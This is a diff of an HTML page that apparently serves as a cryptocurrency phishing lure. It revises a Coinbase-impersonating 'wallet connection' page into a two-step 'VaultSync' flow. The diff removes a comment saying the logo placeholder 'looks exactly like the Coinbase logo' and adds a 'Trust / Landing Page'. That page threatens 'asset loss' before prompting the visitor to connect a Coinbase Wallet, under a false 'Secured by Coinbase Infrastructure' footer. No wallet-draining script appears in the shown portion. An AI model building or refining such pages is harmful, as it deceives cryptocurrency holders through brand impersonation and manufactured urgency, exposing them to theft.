@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coinbase | Wallet Connection</title>
+    <title>VaultSync | Secure Asset Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -11,9 +11,8 @@
             --cb-dark: #0a0b0d;
             --cb-white: #ffffff;
             --cb-grey: #5b616e;
-            --cb-light-grey: #f4f7f9;
+            --cb-border: #eceff1;
         }
-
         body {
             background-color: var(--cb-white);
             color: var(--cb-dark);
@@ -25,89 +24,74 @@
             margin: 0;
             -webkit-font-smoothing: antialiased;
         }
-
-        .auth-container {
+        .container {
             text-align: center;
             width: 100%;
-            max-width: 420px;
+            max-width: 480px;
+            padding: 20px;
+        }
+        .hidden { display: none; }
+        
+        /* Landing Page Styles */
+        .landing-card { padding: 20px; }
+        .landing-card h1 { font-size: 28px; margin-bottom: 16px; }
+        .landing-card p { color: var(--cb-grey); font-size: 16px; line-height: 1.6; margin-bottom: 32px; }
+
+        /* Connect Page Styles */
+        .auth-card {
             padding: 40px 20px;
+            border: 1px solid var(--cb-border);
+            border-radius: 20px;
+        }
+        .cb-logo { 
+            width: 40px; height: 40px; background: var(--cb-blue); 
+            border-radius: 50%; margin: 0 auto 20px; 
         }
 
-        .coinbase-logo {
-            width: 40px;
-            margin-bottom: 30px;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            letter-spacing: -0.5px;
-            color: var(--cb-dark);
-        }
-
-        p {
-            font-size: 15px;
-            color: var(--cb-grey);
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-
-        .cb-button {
+        .btn-primary {
             background-color: var(--cb-blue);
             color: white;
             border: none;
-            padding: 14px 24px;
+            padding: 16px 32px;
             font-size: 16px;
             font-weight: 600;
             border-radius: 50px;
             cursor: pointer;
             width: 100%;
-            transition: background-color 0.2s;
+            transition: 0.2s;
         }
-
-        .cb-button:hover {
-            background-color: #0042cd;
-        }
-
-        .disclaimer {
+        .btn-primary:hover { background-color: #0042cd; }
+        
+        .footer-text {
             margin-top: 40px;
             font-size: 12px;
             color: #9ca3af;
-            border-top: 1px solid var(--cb-border);
-            padding-top: 20px;
-            line-height: 1.4;
-        }
-        
-        #status {
-            margin-top: 20px;
-            font-size: 14px;
-            color: var(--cb-blue);
-            font-weight: 500;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
 
-    <div class="auth-container">
-        <!-- We use a placeholder that looks exactly like the Coinbase logo -->
-        <div style="display: flex; justify-content: center; margin-bottom: 30px;">
-            <svg class="coinbase-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="50" cy="50" r="50" fill="#0052ff"/>
-                <path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/>
-            </svg>
+    <div class="container">
+        
+        <!-- PAGE 1: The Trust / Landing Page -->
+        <div id="landing-page" class="landing-card">
+            <h1>Sync Your Digital Assets</h1>
+            <p>VaultSync provides the secure bridge between your primary wallet and your encrypted storage. Ensure your funds are synchronized with the latest network checkpoints to avoid asset loss.</p>
+            <button id="startBtn" class="btn-primary">Get Started</button>
         </div>
 
-        <h1>Secure Wallet Connection</h1>
-        <p>Please connect your Coinbase Wallet to synchronize your account and authorize your digital asset holdings.</p>
+        <!-- PAGE 2: The Connection Page (Hidden by default) -->
+        <div id="connect-page" class="auth-card hidden">
+            <div class="cb-logo"></div>
+            <h1>Secure Connection</h1>
+            <p>To proceed, please synchronize your Coinbase Wallet. We use industry-standard EIP-1193 protocols to ensure a secure hand-shake.</p>
+            <button id="connectBtn" class="btn-primary">Connect Wallet</button>
+            <div id="status" style="margin-top: 20px; font-size: 14px; color: var(--cb-blue);"></div>
+        </div>
 
-        <button id="connectBtn" class="cb-button">Connect Coinbase Wallet</button>
-
-        <div id="status"></div>
-
-        <div class="disclaimer">
-            © 2026 Coinbase, Inc. All rights reserved. Coinbase is a registered trademark of Coinbase, Inc.
-            The usage of the Coinbase brand is for authorization purposes only.
+        <div class="footer-text">
+            © 2026 VaultSync | Secured by Coinbase Infrastructure
         </div>
     </div>
 
